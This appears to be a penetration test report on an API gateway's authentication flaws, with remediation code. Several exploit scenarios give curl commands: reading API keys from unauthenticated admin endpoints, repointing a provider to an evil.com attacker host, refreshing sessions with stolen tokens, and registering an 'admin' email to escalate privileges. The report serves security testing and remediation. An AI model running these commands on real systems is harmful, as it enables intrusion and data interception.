# RAD Gateway Penetration Test Report

**Report Date:** 2026-02-17  
**Test Scope:** RAD Gateway (Brass Relay) - Phase 6 Security Assessment  
**Tester:** Penetration Tester (Team Charlie)  
**Classification:** CONFIDENTIAL

---

## Executive Summary

This penetration test assessed the security posture of RAD Gateway's authentication, authorization, and API endpoints. The testing revealed **7 security vulnerabilities** ranging from **Critical** to **Medium** severity. The most critical issue is the complete absence of authentication on administrative `/v0/admin/*` endpoints, allowing unauthenticated access to sensitive system data.

### Key Findings Summary

| Severity | Count | Finding IDs |
|----------|-------|-------------|
| **Critical** | 1 | AUTH-001 |
| **High** | 3 | AUTH-002, JWT-001, COOKIE-001 |
| **Medium** | 2 | SSE-001, JWT-002 |
| **Low** | 1 | CORS-001 |

### Risk Assessment

- **Overall Risk Rating:** HIGH
- **Attack Complexity:** LOW (multiple trivial-to-exploit vulnerabilities)
- **Business Impact:** SEVERE (data breach, unauthorized admin access, credential theft)

---

## Test Methodology

### Approach

1. **White-box testing** - Full source code review
2. **Static analysis** - Manual code inspection for security flaws
3. **Configuration review** - Security settings and middleware analysis
4. **Attack vector modeling** - Exploit scenario development

### Tools Used

- Manual source code review
- OWASP ASVS 4.0 as reference standard
- Go security best practices checklist

### Scope

**In Scope:**
- Authentication system (`/v1/auth/*` endpoints)
- JWT implementation (`internal/auth/jwt.go`)
- Admin API endpoints (`/v0/admin/*`)
- SSE endpoints (`/v0/admin/events`)
- Cookie security (`internal/api/auth.go`)
- CORS configuration (`internal/middleware/cors.go`)
- Database layer (`internal/db/*.go`)

**Out of Scope:**
- Infrastructure/network level testing
- Social engineering
- Physical security

---

## Detailed Findings

### CRITICAL-001: Unauthenticated Admin Endpoint Access

**Finding ID:** AUTH-001  
**Severity:** CRITICAL  
**CVSS 3.1 Score:** 9.8 (Critical)

#### Description

All `/v0/admin/*` endpoints are accessible without authentication. The authentication middleware is only applied to `/v0/management/*` endpoints (based on code analysis), leaving the entire administrative API exposed.

#### Affected Components

- `/mnt/ollama/git/RADAPI01/cmd/rad-gateway/main.go:74`
- `/mnt/ollama/git/RADAPI01/internal/admin/*.go` (all admin handlers)
- `/mnt/ollama/git/RADAPI01/internal/api/sse.go:125-126`

#### Vulnerability Details

In `main.go`, the admin handlers are registered without authentication middleware:

```go
// Line 74 - Admin handlers registered WITHOUT authentication
admin.NewHandlers(cfg, usageSink, traceStore).Register(apiMux)

// Line 80 - SSE handler registered WITHOUT authentication
sseHandler := api.NewSSEHandler(healthChecker)
sseHandler.RegisterRoutes(apiMux)
```

The authentication middleware only protects paths requiring API keys:

```go
// Lines 110-119 - Only /health is public, everything else requires auth
// But this is bypassed for SSE endpoints at line 131
```

#### Exploit Scenario

```bash
# 1. Access admin configuration without authentication
curl http://target:8090/v0/admin/config

# 2. List all API keys (information disclosure)
curl http://target:8090/v0/admin/apikeys

# 3. Access real-time SSE events stream
curl -N http://target:8090/v0/admin/events

# 4. Modify provider configuration
curl -X POST http://target:8090/v0/admin/providers \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker-controlled","url":"https://evil.com"}'
```

#### Impact

- Complete administrative access without credentials
- Data exfiltration (API keys, usage data, configurations)
- System compromise (modify routes, providers, quotas)
- Real-time event stream access (sensitive operational data)

#### Proof of Concept

```bash
# Test 1: Access admin endpoints without auth
curl -s http://localhost:8090/v0/admin/config | head -20

# Expected vulnerable response: Returns configuration data
# Expected secure response: {"error":{"message":"authentication required","code":401}}

# Test 2: Access SSE events stream
curl -s -N http://localhost:8090/v0/admin/events

# Expected vulnerable response: SSE stream connects
# Expected secure response: HTTP 401 Unauthorized
```

#### Remediation

**Immediate (Critical Priority):**

1. Apply authentication middleware to all admin endpoints:

```go
// In main.go, wrap admin handlers with auth
adminMux := http.NewServeMux()
admin.NewHandlers(cfg, usageSink, traceStore).Register(adminMux)

// Apply authentication middleware
jwtManager := auth.NewJWTManager(auth.DefaultConfig())
authMW := auth.NewMiddleware(jwtManager)
adminHandler := authMW.Authenticate(adminMux)

// Register with auth
apiMux.Handle("/v0/admin/", http.StripPrefix("/v0/admin", adminHandler))
```

2. For SSE endpoints, implement token validation:

```go
func (h *SSEHandler) handleEvents(w http.ResponseWriter, r *http.Request) {
    // Add authentication check
    claims, ok := auth.GetClaims(r.Context())
    if !ok {
        http.Error(w, `{"error":{"message":"authentication required","code":401}}`, 
            http.StatusUnauthorized)
        return
    }
    
    // Verify admin role
    role, _ := rbac.ParseRole(claims.Role)
    if role != rbac.RoleAdmin {
        http.Error(w, `{"error":{"message":"admin access required","code":403}}`, 
            http.StatusForbidden)
        return
    }
    
    // ... rest of handler
}
```

---

### HIGH-001: Refresh Token Validation Bypass

**Finding ID:** AUTH-002  
**Severity:** HIGH  
**CVSS 3.1 Score:** 8.1 (High)

#### Description

The refresh token endpoint (`/v1/auth/refresh`) does not properly validate refresh tokens. It only checks if the user exists in the claims, allowing token refresh with any valid access token without validating the actual refresh token.

#### Affected Components

- `/mnt/ollama/git/RADAPI01/internal/api/auth.go:184-258`

#### Vulnerability Details

In `handleRefresh()`, the code fetches the user from claims (line 212-220) but never validates the refresh token itself:

```go
// Line 208-210: Comment indicates validation should happen but doesn't
// For now, we validate the refresh token by checking if it matches a stored hash
// In production, this should check a database of valid refresh tokens

// Lines 212-220: Only validates user exists
claims, _ := auth.GetClaims(r.Context())
if claims == nil {
    writeJSONError(w, http.StatusUnauthorized, "session expired")
    return
}
user, err := h.repo.GetByID(ctx, claims.UserID)
```

The refresh token from the request body or cookie is never validated against stored tokens.

#### Exploit Scenario

```bash
# 1. Obtain any valid access token (even expired)
# 2. Use it to refresh and get new tokens indefinitely
# 3. Session never truly expires

curl -X POST http://target:8090/v1/auth/refresh \
  -H "Cookie: access_token=STOLEN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"ANY_INVALID_TOKEN"}'
```

#### Impact

- Session fixation - tokens never expire
- Stolen access tokens can be perpetually refreshed
- No way to revoke compromised sessions

#### Remediation

Implement proper refresh token storage and validation:

```go
func (h *AuthHandler) handleRefresh(w http.ResponseWriter, r *http.Request) {
    // ... extract refresh token ...
    
    // Hash the provided refresh token
    tokenHash := auth.HashToken(refreshToken)
    
    // Validate against stored tokens
    valid, err := h.tokenStore.Validate(r.Context(), claims.UserID, tokenHash)
    if !valid || err != nil {
        writeJSONError(w, http.StatusUnauthorized, "invalid refresh token")
        return
    }
    
    // Revoke old token
    _ = h.tokenStore.Revoke(r.Context(), claims.UserID, tokenHash)
    
    // Generate new token pair
    // ...
}
```

---

### HIGH-002: JWT Secret Generation at Runtime

**Finding ID:** JWT-001  
**Severity:** HIGH  
**CVSS 3.1 Score:** 7.5 (High)

#### Description

If `JWT_ACCESS_SECRET` or `JWT_REFRESH_SECRET` environment variables are not set, the application generates random secrets at runtime using `generateSecret()`. This invalidates all tokens on every restart and could lead to security issues if the secrets are predictable.

#### Affected Components

- `/mnt/ollama/git/RADAPI01/internal/auth/jwt.go:44-52`

#### Vulnerability Details

```go
func DefaultConfig() JWTConfig {
    return JWTConfig{
        AccessTokenSecret:  []byte(getenv("JWT_ACCESS_SECRET", generateSecret())),
        RefreshTokenSecret: []byte(getenv("JWT_REFRESH_SECRET", generateSecret())),
        // ...
    }
}
```

If environment variables are missing, new secrets are generated on each startup, invalidating all existing tokens and potentially using weaker random generation.

#### Impact

- Session persistence broken across restarts
- Potential for secret exposure if logging is misconfigured
- No centralized secret management

#### Remediation

1. **Fail secure** - Require explicit secrets from environment:

```go
func LoadConfig() (JWTConfig, error) {
    accessSecret := os.Getenv("JWT_ACCESS_SECRET")
    if accessSecret == "" {
        return JWTConfig{}, fmt.Errorf("JWT_ACCESS_SECRET is required")
    }
    
    refreshSecret := os.Getenv("JWT_REFRESH_SECRET")
    if refreshSecret == "" {
        return JWTConfig{}, fmt.Errorf("JWT_REFRESH_SECRET is required")
    }
    
    // Validate minimum secret length
    if len(accessSecret) < 32 {
        return JWTConfig{}, fmt.Errorf("JWT_ACCESS_SECRET must be at least 32 characters")
    }
    
    return JWTConfig{
        AccessTokenSecret:  []byte(accessSecret),
        RefreshTokenSecret: []byte(refreshSecret),
        // ...
    }, nil
}
```

2. Add startup validation that fails if secrets are not configured.

---

### HIGH-003: Insecure Cookie Secure Flag

**Finding ID:** COOKIE-001  
**Severity:** HIGH  
**CVSS 3.1 Score:** 7.1 (High)

#### Description

The `isSecure()` function always returns `false`, meaning cookies are never marked as Secure. This allows cookies to be transmitted over unencrypted HTTP connections, making them vulnerable to interception.

#### Affected Components

- `/mnt/ollama/git/RADAPI01/internal/api/auth.go:354-359`
- `/mnt/ollama/git/RADAPI01/internal/api/auth.go:300-324`

#### Vulnerability Details

```go
func (h *AuthHandler) isSecure() bool {
    // In production, this should check if the server is running over HTTPS
    // For now, return false to allow HTTP in development
    return false  // ALWAYS FALSE!
}
```

This results in cookies being set without the Secure flag:

```go
accessCookie := &http.Cookie{
    Name:     "access_token",
    Secure:   h.isSecure(),  // ALWAYS FALSE
    HttpOnly: true,
    SameSite: http.SameSiteStrictMode,
    // ...
}
```

#### Exploit Scenario

1. User logs in via HTTPS
2. Cookie is set without Secure flag
3. Attacker intercepts HTTP traffic (MITM on public WiFi)
4. Cookie is transmitted in plaintext over HTTP
5. Attacker steals session cookie

#### Remediation

1. Detect TLS from request or require explicit configuration:

```go
func (h *AuthHandler) isSecure(r *http.Request) bool {
    // Check X-Forwarded-Proto header (for reverse proxy setups)
    if r.Header.Get("X-Forwarded-Proto") == "https" {
        return true
    }
    
    // Check TLS directly
    if r.TLS != nil {
        return true
    }
    
    // Allow override via environment
    return os.Getenv("FORCE_SECURE_COOKIES") == "true"
}
```

2. Add warning logs when running without secure cookies:

```go
func (h *AuthHandler) setAuthCookies(w http.ResponseWriter, r *http.Request, tokens *auth.TokenPair) {
    if !h.isSecure(r) {
        h.log.Warn("setting insecure cookies - ensure HTTPS in production")
    }
    // ...
}
```

---

### MEDIUM-001: SSE Endpoint Information Disclosure

**Finding ID:** SSE-001  
**Severity:** MEDIUM  
**CVSS 3.1 Score:** 5.3 (Medium)

#### Description

The `/v0/admin/events` SSE endpoint is accessible without authentication and leaks real-time system metrics, provider health status, and circuit breaker states to any connected client.

#### Affected Components

- `/mnt/ollama/git/RADAPI01/internal/api/sse.go:124-127`
- `/mnt/ollama/git/RADAPI01/internal/api/sse.go:130-207`

#### Vulnerability Details

The SSE handler is registered without authentication middleware:

```go
func (h *SSEHandler) RegisterRoutes(mux *http.ServeMux) {
    mux.HandleFunc("/v0/admin/events", h.handleEvents)
    mux.HandleFunc("/v0/admin/events/subscribe", h.handleSubscribe)
}
```

The handler broadcasts sensitive information:
- `EventTypeUsageRealtime`: Request rates, latency, active connections
- `EventTypeProviderHealth`: Provider status, health checks
- `EventTypeCircuitBreaker`: Circuit breaker states

#### Impact

- Reconnaissance data for attackers
- System topology mapping
- Real-time monitoring of operational data

#### Remediation

1. Add authentication middleware wrapper:

```go
func (h *SSEHandler) RegisterRoutes(mux *http.ServeMux, authMW *auth.Middleware) {
    mux.Handle("/v0/admin/events", authMW.Authenticate(
        http.HandlerFunc(h.handleEvents)))
    mux.Handle("/v0/admin/events/subscribe", authMW.Authenticate(
        http.HandlerFunc(h.handleSubscribe)))
}
```

2. Add authorization check for admin role within handler.

---

### MEDIUM-002: Weak Email-Based Role Assignment

**Finding ID:** JWT-002  
**Severity:** MEDIUM  
**CVSS 3.1 Score:** 6.5 (Medium)

#### Description

Role assignment is based on email substring matching (`strings.Contains(req.Email, "admin")`), which is insecure and can lead to privilege escalation.

#### Affected Components

- `/mnt/ollama/git/RADAPI01/internal/api/auth.go:114-119`

#### Vulnerability Details

```go
role := "developer"
if strings.Contains(req.Email, "admin") {
    role = "admin"
    permissions = append(permissions, "delete", "admin")
}
```

This allows any email containing "admin" (e.g., `user+admin@example.com`, `administrator@test.com`) to gain admin privileges.

#### Exploit Scenario

```bash
# Register with email containing "admin" substring
curl -X POST http://target:8090/v1/auth/register \
  -d '{"email":"attacker+admin@example.com","password":"password123"}'

# User automatically gets admin role
```

#### Remediation

1. Remove automatic role assignment based on email
2. Implement explicit role management through database:

```go
// Fetch role from database based on user record
role, err := h.repo.GetUserRole(ctx, user.ID)
if err != nil {
    role = rbac.RoleDeveloper // Default role
}

// Or validate against explicit admin list
if user.IsAdmin {
    role = rbac.RoleAdmin
}
```

---

### LOW-001: CORS Credentials with Wildcard Origins

**Finding ID:** CORS-001  
**Severity:** LOW  
**CVSS 3.1 Score:** 4.3 (Medium if wildcard enabled)

#### Description

The CORS middleware allows wildcard origins and has `AllowCredentials: true`, which violates the CORS specification. If `*` is added to `AllowedOrigins`, it would allow authenticated cross-origin requests from any origin.

#### Affected Components

- `/mnt/ollama/git/RADAPI01/internal/middleware/cors.go:35-66`
- `/mnt/ollama/git/RADAPI01/internal/middleware/cors.go:110-127`

#### Vulnerability Details

The code has logic to prevent credentials with wildcard, but the configuration allows it:

```go
// Lines 132-138: Logic to prevent credential leak
func (c *CORS) setHeaders(w http.ResponseWriter, origin string) {
    if c.isOriginAllowed("*") && !c.config.AllowCredentials {
        w.Header().Set("Access-Control-Allow-Origin", "*")
    } else {
        w.Header().Set("Access-Control-Allow-Origin", origin)
    }
}
```

However, the default config has `AllowCredentials: true` and allows wildcard origins programmatically.

#### Impact

- Potential credential theft via malicious websites
- Cross-origin request forgery if wildcard is enabled

#### Remediation

1. Add validation to prevent unsafe configurations:

```go
func NewCORS(config CORSConfig) (*CORS, error) {
    // Validate: credentials + wildcard is unsafe
    if config.AllowCredentials {
        for _, origin := range config.AllowedOrigins {
            if origin == "*" {
                return nil, fmt.Errorf("CORS: cannot use wildcard origin with credentials enabled")
            }
        }
    }
    
    return &CORS{
        config: config,
        log:    logger.WithComponent("cors"),
    }, nil
}
```

2. Use explicit origin validation in production.

---

## Additional Security Observations

### Informational: JWT Algorithm Validation

The JWT validation correctly checks for HMAC signing method:

```go
if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
    return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
}
```

This prevents algorithm confusion attacks ("none" algorithm, RSA to HMAC confusion).

### Informational: SQL Injection Prevention

Database queries use parameterized queries throughout:

```go
query := `SELECT id FROM users WHERE email = $1`
err := r.db.QueryRowContext(ctx, query, email).Scan(&id)
```

No SQL injection vulnerabilities were identified in the database layer.

### Informational: Password Hashing

Passwords are hashed using bcrypt via the `auth.PasswordHasher` interface, which is secure.

---

## Attack Scenarios

### Scenario 1: Complete System Compromise

**Steps:**
1. Attacker discovers `/v0/admin/*` endpoints are unauthenticated
2. Enumerates API keys via `/v0/admin/apikeys`
3. Modifies provider routes to route traffic through attacker-controlled proxy
4. Exfiltrates all AI request/response data
5. Disables circuit breakers to cause denial of service

**Impact:** Complete confidentiality, integrity, and availability compromise

### Scenario 2: Session Hijacking via Insecure Cookies

**Steps:**
1. User logs in via HTTPS endpoint
2. Attacker performs MITM attack on public network
3. Forces downgrade to HTTP (SSL stripping)
4. Steals unencrypted session cookies
5. Impersonates user with stolen cookies

**Impact:** Account takeover, unauthorized access

### Scenario 3: Privilege Escalation via Email Manipulation

**Steps:**
1. Attacker registers with email `attacker+admin@example.com`
2. Automatic admin role assignment
3. Full administrative access granted

**Impact:** Unauthorized administrative access

---

## Remediation Roadmap

### Immediate (24-48 hours)

1. **CRITICAL**: Add authentication middleware to all `/v0/admin/*` endpoints
2. **CRITICAL**: Implement proper refresh token validation storage
3. **HIGH**: Fix cookie Secure flag to use HTTPS detection

### Short-term (1 week)

4. **HIGH**: Remove runtime JWT secret generation; require environment variables
5. **MEDIUM**: Implement proper role management (remove email substring matching)
6. **MEDIUM**: Add authentication to SSE endpoints

### Medium-term (2-4 weeks)

7. **LOW**: Implement CORS configuration validation
8. Add rate limiting on authentication endpoints
9. Implement proper audit logging for admin actions
10. Add Content Security Policy headers

---

## Verification Steps

After remediation, verify fixes with these tests:

```bash
# Test 1: Admin endpoints require authentication
curl -s http://localhost:8090/v0/admin/config
# Expected: {"error":{"message":"authentication required","code":401}}

# Test 2: Refresh token validation
curl -X POST http://localhost:8090/v1/auth/refresh \
  -d '{"refresh_token":"invalid"}'
# Expected: {"error":{"message":"invalid refresh token","code":401}}

# Test 3: SSE requires authentication
curl -s http://localhost:8090/v0/admin/events
# Expected: HTTP 401 Unauthorized

# Test 4: Cookie Secure flag (when HTTPS enabled)
curl -s -k https://localhost:8090/v1/auth/login \
  -d '{"email":"test@example.com","password":"password"}' \
  -D - | grep -i "Set-Cookie"
# Expected: Set-Cookie: access_token=...; Secure; HttpOnly; SameSite=Strict
```

---

## Conclusion

The RAD Gateway application has significant authentication and authorization vulnerabilities that require immediate remediation. The unprotected admin endpoints represent a critical security flaw that could lead to complete system compromise. 

The development team should prioritize:
1. Implementing authentication on all admin endpoints
2. Proper refresh token validation
3. Secure cookie configuration

After remediation, a follow-up penetration test is recommended to verify all findings have been properly addressed.

---

## References

- OWASP ASVS 4.0: https://owasp.org/www-project-application-security-verification-standard/
- OWASP Top 10 2021: https://owasp.org/Top10/
- JWT Best Practices (RFC 8725): https://tools.ietf.org/html/rfc8725
- CORS Specification: https://fetch.spec.whatwg.org/#cors-protocol

---

**Report Prepared By:** Penetration Tester, Team Charlie (Security Hardening)  
**Reviewed By:** Security Architect  
**Date:** 2026-02-17  
**Distribution:** Team Alpha (Architecture), Team Golf (Documentation)
